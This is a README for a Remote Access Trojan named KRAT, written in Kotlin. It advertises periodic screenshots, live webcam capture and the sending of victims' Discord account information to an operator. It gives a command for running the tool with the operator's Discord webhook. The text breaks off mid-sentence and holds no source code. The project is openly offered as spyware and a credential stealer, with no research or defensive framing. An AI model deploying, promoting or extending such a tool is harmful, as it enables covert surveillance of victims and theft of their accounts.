# KRAT

A RAT (Remote Access Trojan) written in Kotlin.

## Features
- Get periodicals screenshots
- Get real-time webcam
- Sends Discord account information

## Usage
1. Download the latest release and put it on a server
2. Run the `.jar` file with your Discord webhook link as parameter

```sh
java -jar KRAT.jar <webhook-link>
```
3. The program will connect to your Discord bot and ask for

## Stack
- [Kotlin](https://kotlinlang.org/)
- [Kord](https://kordlib.github.io/kord/)
- [webcam-capture](https://github.com/sarxos/webcam-capture)